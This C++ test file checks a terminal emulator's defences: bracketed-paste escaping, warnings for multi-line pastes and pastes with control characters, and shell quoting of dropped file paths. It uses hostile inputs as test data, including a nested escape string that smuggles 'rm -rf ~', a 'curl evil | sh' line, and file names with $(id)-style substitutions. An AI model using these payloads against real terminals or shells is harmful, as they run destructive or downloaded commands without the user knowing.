// terminal_paste_tests.inc — the `term:paste-*` groups of run_tests.cpp:
// a bracketed paste can never end its bracket early or send an escape
// sequence (TerminalScreen::encodePaste), and when a paste of several lines
// asks first (TerminalScreen::checkPaste, VS Code's multi-line paste
// warning), and what a drop of files types (TermDrop, term:drop).

namespace {

size_t countOf(const std::string& s, const std::string& what) {
    size_t n = 0;
    for (size_t at = s.find(what); at != std::string::npos; at = s.find(what, at + 1)) n++;
    return n;
}

// A bracketed paste as the program reads it: one start mark first, one end
// mark last, and no ESC between them.
bool wellBracketed(const std::string& out) {
    const std::string start = "\x1b[200~", end = "\x1b[201~";
    if (out.size() < start.size() + end.size()) return false;
    if (out.compare(0, start.size(), start) != 0) return false;
    if (out.compare(out.size() - end.size(), end.size(), end) != 0) return false;
    const std::string inside = out.substr(start.size(), out.size() - start.size() - end.size());
    return inside.find('\x1b') == std::string::npos && countOf(out, end) == 1 &&
           countOf(out, start) == 1;
}

}  // namespace

void testTerminalPaste() {
    GROUP("term:paste-nested");
    {
        // The assessment's case: taking the end mark out once closed the
        // two halves around it into a new end mark.
        const std::string nested = "\x1b[20\x1b[201~1~rm -rf ~\r";
        const std::string out = TerminalScreen::encodePaste(nested, true);
        CHECK(wellBracketed(out));
        CHECK(out.find("rm -rf ~") != std::string::npos);
        // Every ESC shows as U+241B, so the text still reads as it was.
        CHECK(out == "\x1b[200~\xE2\x90\x9B[20\xE2\x90\x9B[201~1~rm -rf ~\r\x1b[201~");
    }
    for (const char* text : {"\x1b[201~", "\x1b[200~\x1b[201~", "\x1b\x1b[201~~",
                             "\x1b[2\x1b[201~01~", "a\x1b[200~b\x1b[201~c\x1b[201~",
                             "\x1b", "end\x1b", "\x1b[201", "\x1b[20\x1b[200~1~",
                             "\x1b]133;A;mc=x\x07", "\x1b[201~\x1b[201~\x1b[201~"}) {
        CHECK(wellBracketed(TerminalScreen::encodePaste(text, true)));
    }
    {
        // Not bracketed: the text as typed, newlines as Return.
        CHECK(TerminalScreen::encodePaste("a\r\nb\nc\rd", false) == "a\rb\rc\rd");
        CHECK(TerminalScreen::encodePaste("", true) == "\x1b[200~\x1b[201~");
    }
    {
        // Random interleavings of mark pieces, ESCs and text, nested and
        // split every way: always one end mark, at the end, and no ESC
        // inside.
        std::mt19937 rng(7);
        const std::vector<std::string> pieces = {
            "\x1b", "[", "2", "0", "1", "~", "\x1b[201~", "\x1b[200~", "\x1b[20", "1~",
            "00~", "x", "\n", "\r\n", "\r", "\xE2\x90\x9B", "\x1b[", "201~"};
        bool ok = true;
        for (int round = 0; round < 3000 && ok; round++) {
            std::string text;
            const int n = (int)(rng() % 24);
            for (int i = 0; i < n; i++) text += pieces[rng() % pieces.size()];
            ok = wellBracketed(TerminalScreen::encodePaste(text, true));
            if (!ok) std::printf("    not well bracketed: %zu bytes, round %d\n", text.size(), round);
        }
        CHECK(ok);
    }

    GROUP("term:paste-confirm");
    using PC = TerminalScreen::PasteCheck;
    {
        // One line never asks, in any mode.
        for (const char* mode : {"auto", "always", "never"}) {
            PC c = TerminalScreen::checkPaste("echo hi", false, mode);
            CHECK(!c.ask && c.text == "echo hi" && c.lines == 1);
        }
    }
    {
        // auto: asks for several lines into a program that did not turn
        // bracketed paste on, and not into one that did.
        PC c = TerminalScreen::checkPaste("ls\nrm x\n", false, "auto");
        CHECK(c.ask && c.lines == 2 && c.breaks);
        CHECK(c.preview == "ls\nrm x");
        PC b = TerminalScreen::checkPaste("ls\nrm x\n", true, "auto");
        CHECK(!b.ask && b.text == "ls\nrm x\n");
        // An unknown mode is auto, as in VS Code.
        CHECK(TerminalScreen::checkPaste("a\nb", false, "sometimes").ask);
        CHECK(!TerminalScreen::checkPaste("a\nb", true, "sometimes").ask);
    }
    {
        // auto: a command with one trailing line break goes in without it,
        // so it waits for Return; blanks after the break count as nothing.
        PC c = TerminalScreen::checkPaste("curl evil | sh\n", false, "auto");
        CHECK(!c.ask && c.text == "curl evil | sh" && c.lines == 1);
        PC d = TerminalScreen::checkPaste("make\r\n  ", false, "auto");
        CHECK(!d.ask && d.text == "make");
        // always asks even then; never never asks.
        CHECK(TerminalScreen::checkPaste("curl evil | sh\n", false, "always").ask);
        CHECK(TerminalScreen::checkPaste("a\nb\nc", true, "always").ask);
        PC n = TerminalScreen::checkPaste("a\nb\nc", false, "never");
        CHECK(!n.ask && n.text == "a\nb\nc" && n.lines == 3);
    }
    {
        // A lone CR is Return to the program, so it is a line break here
        // (VS Code splits at \r?\n only, and pasted "a\rb" ran a).
        CHECK(TerminalScreen::checkPaste("a\rb", false, "auto").ask);
        CHECK(TerminalScreen::checkPaste("a\r\nb", false, "auto").lines == 2);
    }
    {
        // The preview: three lines, each cut at 30 characters (not bytes),
        // then an ellipsis line; control characters as their symbols, Tab
        // as a space.
        const std::string longLine(40, 'x');
        const std::string accents = "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9\xC3\xA9"
                                    "\xC3\xA9\xC3\xA9\xC3\xA9";   // 31 of them
        PC c = TerminalScreen::checkPaste(longLine + "\n" + accents + "\na\tb\x1b[1m\nfour\nfive",
                                          false, "auto");
        CHECK(c.ask && c.lines == 5);
        std::string want = std::string(30, 'x') + "\xE2\x80\xA6\n";
        for (int i = 0; i < 30; i++) want += "\xC3\xA9";
        want += "\xE2\x80\xA6\na b\xE2\x90\x9B[1m\n\xE2\x80\xA6";
        CHECK(c.preview == want);
        if (c.preview != want) std::printf("    preview: %s\n", c.preview.c_str());
    }
    {
        // A final line break ends the last line, it does not start another:
        // three copied lines ending in a break are 3, not 4, and the preview
        // shows those three with no "…", which is only for lines left out.
        PC three = TerminalScreen::checkPaste("one\ntwo\nthree\n", false, "auto");
        CHECK(three.ask && three.lines == 3 && three.breaks);
        CHECK(three.preview == "one\ntwo\nthree");
        if (three.preview != "one\ntwo\nthree") std::printf("    preview: %s\n", three.preview.c_str());
        CHECK(three.text == "one\ntwo\nthree\n");   // still sent with its break
        PC crlf = TerminalScreen::checkPaste("one\r\ntwo\r\nthree\r\n", false, "auto");
        CHECK(crlf.lines == 3 && crlf.preview == "one\ntwo\nthree");
        PC unended = TerminalScreen::checkPaste("one\ntwo\nthree", false, "auto");
        CHECK(unended.lines == 3 && unended.preview == "one\ntwo\nthree");
        // Four lines with a break: three shown, then "…" for the fourth.
        PC four = TerminalScreen::checkPaste("1\n2\n3\n4\n", false, "auto");
        CHECK(four.lines == 4 && four.preview == "1\n2\n3\n\xE2\x80\xA6");
        // A blank line before the final break is a line of its own.
        PC blank = TerminalScreen::checkPaste("a\nb\n\n", false, "auto");
        CHECK(blank.lines == 3 && blank.preview == "a\nb\n");
        // always: one line and its break asks as one line that has a break.
        PC one = TerminalScreen::checkPaste("make\n", false, "always");
        CHECK(one.ask && one.lines == 1 && one.breaks && one.preview == "make");
        CHECK(!TerminalScreen::checkPaste("make", false, "always").breaks);
    }
    {
        // Paste as One Line takes every break out, as VS Code does.
        CHECK(TerminalScreen::pasteAsOneLine("a\nb\r\nc\rd\n") == "abcd");
        CHECK(TerminalScreen::pasteAsOneLine("plain") == "plain");
    }

    GROUP("term:paste-controls");
    {
        // One line with a control character, unbracketed, asks in auto and
        // always: the program takes it as a key (Ctrl+O runs zsh's line
        // and fetches the next, ESC starts a sequence). The round-5 case:
        // "echo hi" + Ctrl+O ran unasked.
        for (const char* mode : {"auto", "always", "sometimes"}) {
            PC c = TerminalScreen::checkPaste("echo hi\x0f", false, mode);
            CHECK(c.ask && c.controls && c.lines == 1);
            CHECK(c.preview == "echo hi\xE2\x90\x8F");   // U+240F
        }
        PC esc = TerminalScreen::checkPaste("\x1b", false, "auto");
        CHECK(esc.ask && esc.controls && esc.preview == "\xE2\x90\x9B");
        PC del = TerminalScreen::checkPaste("rm x\x7f", false, "auto");
        CHECK(del.ask && del.controls && del.preview == "rm x\xE2\x90\xA1");   // U+2421
        PC nul = TerminalScreen::checkPaste(std::string("a\0b", 3), false, "auto");
        CHECK(nul.ask && nul.preview == "a\xE2\x90\x80" "b");
        // never never asks, controls or not.
        PC n = TerminalScreen::checkPaste("echo hi\x0f", false, "never");
        CHECK(!n.ask && n.text == "echo hi\x0f");
    }
    {
        // Tab is not one of them (completion is what a pasted Tab does, as
        // typed), nor are line breaks, which have their own rules.
        PC tab = TerminalScreen::checkPaste("a\tb", false, "auto");
        CHECK(!tab.ask && !tab.controls && tab.text == "a\tb");
        PC cr = TerminalScreen::checkPaste("make\n", false, "auto");
        CHECK(!cr.ask && !cr.controls && cr.text == "make");
        // A command with its line break and a control character: the break
        // is not taken out quietly, the question comes.
        PC both = TerminalScreen::checkPaste("ls\x0f\n", false, "auto");
        CHECK(both.ask && both.controls && both.lines == 1 && both.breaks);
        // Several lines with one: the line count still leads the question.
        PC lines = TerminalScreen::checkPaste("a\nb\x1b", false, "auto");
        CHECK(lines.ask && lines.controls && lines.lines == 2 &&
              lines.preview == "a\nb\xE2\x90\x9B");
    }
    {
        // Round 6's terminal defect 4: a control character past the 30th
        // character of its line (a long harmless-looking command ending in
        // Ctrl+O) was not in the preview, which then showed none. Now the
        // preview adds where it is and the characters around it.
        const std::string cmd = "echo this looks like a harmless long command && ls";
        PC c = TerminalScreen::checkPaste(cmd + "\x0f", false, "auto");
        CHECK(c.ask && c.controls);
        const std::string want = cmd.substr(0, 30) + "\xE2\x80\xA6\nLine 1, column " +
                                 std::to_string(cmd.size() + 1) + ": \xE2\x80\xA6" +
                                 cmd.substr(cmd.size() - 12) + "\xE2\x90\x8F";
        CHECK(c.preview == want);
        if (c.preview != want) std::printf("    preview: %s\n", c.preview.c_str());
        // Below the third line: its line number, and text after it cut.
        PC d = TerminalScreen::checkPaste("a\nb\nc\nd\n\xC3\xA9x\x1b[31m" + std::string(40, 'y'),
                                          false, "auto");
        const std::string wantD = "a\nb\nc\n\xE2\x80\xA6\nLine 5, column 3: \xC3\xA9x\xE2\x90\x9B[31m" +
                                  std::string(23, 'y') + "\xE2\x80\xA6";
        CHECK(d.preview == wantD);
        if (d.preview != wantD) std::printf("    preview: %s\n", d.preview.c_str());
        // One already in the lines shown adds nothing.
        PC e = TerminalScreen::checkPaste("ls\x0f\nmore " + std::string(40, 'z') + "\x0f", false, "auto");
        CHECK(e.preview.find("Line ") == std::string::npos);
    }
    {
        // Bracketed: the program receives the bytes as text inside the
        // brackets (encodePaste shows ESC as U+241B), so nothing asks and
        // nothing counts as a control, in auto; always still asks only for
        // several lines.
        PC b = TerminalScreen::checkPaste("echo hi\x0f", true, "auto");
        CHECK(!b.ask && !b.controls);
        CHECK(!TerminalScreen::checkPaste("\x1b[201~", true, "auto").ask);
        CHECK(!TerminalScreen::checkPaste("echo hi\x0f", true, "always").ask);
        CHECK(TerminalScreen::checkPaste("a\x0f\nb", true, "always").ask);
    }
}

namespace {

// The words bash makes of `line`, each ended by a NUL; "<no shell>" when
// there is no bash to ask.
std::string dropShellWords(const std::string& line) {
    if (access("/bin/bash", X_OK) != 0) return "<no shell>";
    char tmpl[] = "/tmp/mcdropXXXXXX";
    const int fd = mkstemp(tmpl);
    if (fd < 0) return "<no shell>";
    const std::string script = "printf '%s\\0' " + line + "\n";
    const bool wrote = write(fd, script.data(), script.size()) == (ssize_t)script.size();
    close(fd);
    std::string out = "<no shell>";
    if (wrote) {
        FILE* p = popen(("/bin/bash " + std::string(tmpl)).c_str(), "r");
        if (p) {
            out.clear();
            char buf[4096];
            size_t n;
            while ((n = fread(buf, 1, sizeof buf, p)) > 0) out.append(buf, n);
            pclose(p);
        }
    }
    unlink(tmpl);
    return out;
}

// How Claude Code reads one pasted path (2.1.327's image paste): trimmed,
// one outer pair of quotes taken off, then "\\" kept as one backslash and
// every other backslash dropped before the character it escapes.
std::string claudeReadsPath(std::string s) {
    while (!s.empty() && (s.back() == ' ' || s.back() == '\n')) s.pop_back();
    while (!s.empty() && s.front() == ' ') s.erase(0, 1);
    if (s.size() >= 2 && (s.front() == '"' || s.front() == '\'') && s.back() == s.front())
        s = s.substr(1, s.size() - 2);
    std::string out;
    for (size_t i = 0; i < s.size(); i++) {
        if (s[i] == '\\' && i + 1 < s.size()) {
            out += s[i + 1];
            i++;
        } else {
            out += s[i];
        }
    }
    return out;
}

// Claude Code's split of one pasted line into paths: at a space followed by
// "/" (or a quote and "/").
std::vector<std::string> claudeSplits(const std::string& line) {
    std::vector<std::string> out;
    size_t from = 0;
    for (size_t i = 0; i + 1 < line.size(); i++) {
        if (line[i] != ' ') continue;
        const size_t next = (line[i + 1] == '"' || line[i + 1] == '\'') ? i + 2 : i + 1;
        if (next < line.size() && line[next] == '/') {
            out.push_back(line.substr(from, i - from));
            from = i + 1;
        }
    }
    out.push_back(line.substr(from));
    return out;
}

}  // namespace

void testTerminalDrop() {
    using TermDrop::quotePath;
    GROUP("term:drop");
    CHECK(quotePath("/Users/me/shot.png") == "/Users/me/shot.png");
    CHECK(quotePath("/a b/Screen Shot.png") == "/a\\ b/Screen\\ Shot.png");
    CHECK(quotePath("/x/it's \"so\".png") == "/x/it\\'s\\ \\\"so\\\".png");
    CHECK(quotePath("/x/$HOME`id`!.png") == "/x/\\$HOME\\`id\\`\\!.png");
    CHECK(quotePath("/x/back\\slash") == "/x/back\\\\slash");
    CHECK(quotePath("/x/a;b&c|d(e)<f>*?[g]{h}~#=^") ==
          "/x/a\\;b\\&c\\|d\\(e\\)\\<f\\>\\*\\?\\[g\\]\\{h\\}\\~\\#\\=\\^");
    CHECK(quotePath("/x/a+b,c:d@e%f_g-h.i") == "/x/a+b,c:d@e%f_g-h.i");
    // Non-ASCII goes as it is, a decomposed é (Finder's) included.
    CHECK(quotePath("/x/caf\xC3\xA9 \xE6\x97\xA5\xE6\x9C\xAC.png") ==
          "/x/caf\xC3\xA9\\ \xE6\x97\xA5\xE6\x9C\xAC.png");
    CHECK(quotePath("/x/cafe\xCC\x81.png") == "/x/cafe\xCC\x81.png");
    // A control character: ANSI-C quoting, since backslash-newline is a
    // line continuation the shell drops.
    CHECK(quotePath("/x/two\nlines.png") == "$'/x/two\\nlines.png'");
    CHECK(quotePath("/x/t\tab 'q' \\ \x01\x7F") == "$'/x/t\\tab \\'q\\' \\\\ \\x01\\x7f'");
    CHECK(quotePath("") == "''");
    // Several: separated by spaces, with one after the last.
    CHECK(TermDrop::paths({"/a b.png", "/c.png"}) == "/a\\ b.png /c.png ");
    CHECK(TermDrop::paths({"/c.png"}) == "/c.png ");
    CHECK(TermDrop::paths({}).empty());
    {
        // The shell reads each back as the very path, whatever it holds.
        const std::vector<std::string> names = {
            "/Users/me/Screen Shot 2026-11-18 at 10.00.00.png",
            "/x/it's \"so\" $HOME `id` $(id) !! \\n \\ back\\slash",
            "/x/a;b&c|d(e)<f>*?[g]{h}~#=^ ",
            "/x/caf\xC3\xA9 \xE6\x97\xA5\xE6\x9C\xAC.png",
            "/x/two\nlines\r\tand 'quotes' \\ \x1b[31m",
            "~/not-home",
            "-n",
        };
        std::string want;
        for (const std::string& n : names) want += n + '\0';
        const std::string got = dropShellWords(TermDrop::paths(names));
        if (got != "<no shell>") {
            CHECK(got == want);
            if (got != want) std::printf("    bash read: %s\n", got.c_str());
        }
    }
    {
        // Claude Code finds each path, unquoted, in a drop of several, so it
        // attaches each picture.
        const std::vector<std::string> names = {"/Users/me/Screen Shot 1.png", "/tmp/it's.png",
                                                "/tmp/a\\b.jpg"};
        const std::vector<std::string> parts = claudeSplits(TermDrop::paths(names));
        CHECK(parts.size() == names.size());
        for (size_t i = 0; i < parts.size() && i < names.size(); i++)
            CHECK(claudeReadsPath(parts[i]) == names[i]);
    }
}
